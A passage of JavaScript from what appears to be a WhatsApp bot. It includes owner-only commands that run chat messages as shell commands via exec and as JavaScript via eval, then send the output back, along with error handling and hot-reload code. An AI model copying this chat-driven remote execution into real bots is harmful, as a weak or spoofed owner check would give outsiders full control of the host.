if (body.startsWith('$')){
if(!isCreator) return reply(`*[ System Notice ]* cannot access`)
qur = body.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply795(`${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (body.startsWith('<')) {
if(!isCreator) return reply(`*[ System Notice ]* cannot access`)
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}


}
} catch (err) {
console.log(err)
console.log(chalk.bgRed(chalk.black("[  ERROR  ]")),util.format(err))
let e = String(err) 
if (e.includes("this.isZero")) {return}
if (e.includes("rate-overlimit")) {
if(!alice.public) return
alice.self = false
await alice.sendMessage(global.owner,{ 
text: `Terjadi Rete Overlimit!`
})
await setTimeout(() => {
alice.self = true
 alice.sendMessage(global.owner,{ 
text: `Berhasil mengubah mode self ke mode public`
})
}, 60000)
return
}
if (e.includes('Connection Closed')){ return }
if (e.includes('Timed Out')){ return }
if (e.includes('Value not found')){ return }
console.log(chalk.white('Message Error : %s'), chalk.green(util.format(e)))
m.reply(util.format(err))
}
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.yellowBright(`Update File Terbaru ${__filename}`))
delete require.cache[file]
require(file)
})